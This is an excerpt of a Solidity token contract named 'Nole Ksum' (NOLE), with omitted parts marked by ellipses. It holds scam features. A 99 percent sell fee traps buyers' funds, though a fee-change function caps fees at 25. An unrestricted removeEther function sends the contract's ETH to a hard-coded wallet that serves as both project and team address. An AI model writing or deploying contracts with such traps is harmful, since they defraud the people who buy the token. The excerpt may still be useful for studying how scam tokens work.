...
contract NOLE is Ownable, IERC20 {

    using SafeMath for uint256;

    string private constant _name = "Nole Ksum";
    string private constant _symbol = "NOLE";
    ...
    uint256 public totalFeeIfSelling = 99;
    ...
    constructor() {
        ...
        lpWallet = msg.sender;
        projectAddress = 0x805f24c7A52454B10b92D3BB9939997ACDeFf8b3;
        teamAddress = 0x805f24c7A52454B10b92D3BB9939997ACDeFf8b3;
    ...
    function changeFees(
        ...
        require(totalFee + extraSellFee <= 25);
    }
    ...
    function removeEther(uint256 amountPercentage) external {
        uint256 amountETH = address(this).balance;
        payable(projectAddress).transfer((amountETH * amountPercentage) / 100);
    }
    ...
    function swapBackAndPair() internal lockTheSwap {
        ...
        if (amountETH > 50000000000000000){
